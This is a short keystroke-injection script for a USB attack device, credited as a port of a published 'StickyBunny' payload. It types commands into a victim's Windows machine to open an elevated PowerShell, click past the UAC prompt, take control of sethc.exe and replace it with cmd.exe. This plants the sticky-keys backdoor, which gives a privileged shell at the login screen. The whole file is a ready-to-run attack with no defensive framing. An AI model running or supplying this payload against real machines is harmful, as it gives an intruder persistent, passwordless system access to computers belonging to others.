// Based on the Bash bunny payload "StickyBunny" by Squibs: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/execution/StickyBunny
layout('us');
press("GUI r");
delay(500);
type("powershell Start-Process powershell -Verb runAs\n")
delay(1000);
press("SHIFT TAB");
delay(100);
press("ENTER");
delay(500);
type("$Acl = Get-Acl sethc.exe")
press("ENTER")
delay(500);
type("$Ar = New-Object  system.security.accesscontrol.filesystemaccessrule($env:UserName,\"FullControl\",\"Allow\")")
press("ENTER")
delay(500);
type("$Acl.SetAccessRule($Ar)")
press("ENTER")
delay(500);
type("Set-Acl sethc.exe $Acl")
press("ENTER")
delay(500);
type("xcopy sethc.exe sethc.exe.bak")
press("ENTER")
delay(1500);
press("F")
delay(500);
type("xcopy cmd.exe sethc.exe")
press("ENTER")
delay(500);
press("Y")
press("ENTER")
delay(500);
type("EXIT\n")
